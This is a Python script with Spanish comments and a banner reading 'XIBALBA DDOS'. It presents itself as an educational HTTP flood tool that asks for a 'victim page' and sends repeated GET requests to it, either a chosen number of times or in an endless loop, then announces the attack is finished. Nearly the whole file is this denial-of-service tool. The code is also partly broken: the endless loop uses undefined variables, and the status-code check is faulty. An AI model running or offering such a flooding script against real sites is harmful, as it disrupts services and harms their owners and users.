#!/usr/bin/env Python 3.8
# -*- coding: UTF-8 -*-



# SCRIPT BY : VULK4N0 / COLM3N4
# USAR EL ESCRIPT EN ENTORNOS CONTROLADOS
# ( CREADA PARA FINES EDUCATIVOS )

#O--- modulos ---O#
from requests.exceptions import ConnectionError
import requests ,time ,sys ,os

#O--- LIMPIAR ---O#
def clean():
	if os.name == 'nt':
		os.system('cls')
	else:
		os.system('clear')
#O--- BANNER ---O
def banner():
	print("""\033[0;31m
	
 
 ▒██   ██▒  ██▓  ▄▄▄▄    ▄▄▄       ██▓     ▄▄▄▄    ▄▄▄      
 ▒▒ █ █ ▒░▓ ██▒ ▓█████▄ ▒████▄    ▓██▒    ▓█████▄ ▒████▄    
 ░░  █   ░▒ ██▒ ▒██▒ ▄██▒██  ▀█▄  ▒██░    ▒██▒ ▄██▒██  ▀█▄  
  ░ █ █ ▒ ░ ██░ ▒██░█▀  ░██▄▄▄▄██ ▒██░    ▒██░█▀  ░██▄▄▄▄██ 
 ▒██▒ ▒██▒░ ██░ ░▓█  ▀█▓ ▓█   ▓██▒░██████▒░▓█  ▀█▓ ▓█   ▓██▒
 ▒▒ ░ ░▓ ░░ ██   ░▒▓███▀▒ ▒▒   ▓▒█░░ ▒░▓  ░░▒▓███▀▒ ▒▒   ▓▒█░
 ░░   ░▒ ░   ░ ▒░▒   ░   ▒   ▒▒ ░░ ░ ▒  ░▒░▒   ░   ▒   ▒▒ ░
  ░    ░     ░  ░    ░   ░   ▒     ░ ░    ░    ░   ░   ▒   
  ░    ░    ░    ░            ░  ░    ░  ░ ░            ░  
 
 ▓█████▄ ▓█████▄  ▒█████    ██████ 
 ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
 ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
 ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
 ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
  ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
  ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
  ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
    ░       ░        ░ ░         
      
      
      ███۞███████]▄▄▄▄▄▄▄▄▄▃  ▄ ▄ ▄
  ▂▄▅█████████▅▄▃▂
  I███████████████████].
  ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...                         
      
      
      -Recuerda protegerte, usa esta herramienta bajo tu protección.                     
                            by: C0lm3n4/Vulk4n0
                            
\033[0;m""")
clean()
banner()
#o--- PAGINA VICTIMA ---o
web=input("\nINGRESAR LA PAGINA > ")
valor=0
#o pregunta o#

c=input("\nHARA UNA CANTIDAD DETERMINADA DE PAQUETES? [Y]|[N] > ")
if c.lower()=="y":
	envio=input("\nINGRESE LA CANTIDAD DE PEDIDOS QUE HARA > ")
	print("\n««------------- LOS RESULTADOS SE VERAN ACA -------------»»\n")
	for i in range(0,int(envio)):
		try:
			try:
				pds = requests.get(web)
				if pds.status_code < 200 or pds.status_code <= 201:
					print("\n\033[0;30;42mPAQUETE ENVIADO A {} ( {} de {})\033[0;m".format(web,i,envio))
				else:
					print("\n\033[0;37;41mPAQUETE PERDIDO(EL PAQUETE PERDIDO ( {} de {} ))\033[0;m".format(i ,envio))
			except requests.exceptions.MissingSchema:
				print("\n\033[0;37;41mRECUERDE QUE DEBE USAR EL FORMATO DEL LINK ( https or http )\n\033[0;m")
				break
		except ConnectionError:
			print("\n\033[0;37;41mCONECTION ERROR ( RECUERDE QUE DEBE TENER UNA CONEXION ESTABLE )\033[0;m")
			break
else:
	while True:
		try:
			try:
				pds = requests.get(web)
				if pds.status_code < 200 or pds.status_code <= 201:
					print("\n\033[0;30;42mPAQUETE ENVIADO A {} ( {} de INFINITO ( Ø ))\033[0;m".format(web,i,envio))
				else:
					print("\n\033[0;37;41mPAQUETE PERDIDO(EL PAQUETE PERDIDO ( {} de {} ))\033[0;m".format(i ,envio))
				valor+=1
			except requests.exceptions.MissingSchema:
				print("\n\033[0;37;41mRECUERDE QUE DEBE USAR EL FORMATO DEL LINK ( https or http )\n\033[0;m")
				break
		except ConnectionError:
			print("\n\033[0;37;41mCONECTION ERROR ( RECUERDE QUE DEBE TENER UNA CONEXION ESTABLE )\033[0;m")
			break

print("\n\033[0;30;42mATAQUE FINALIZADO UWU\033[0;m")



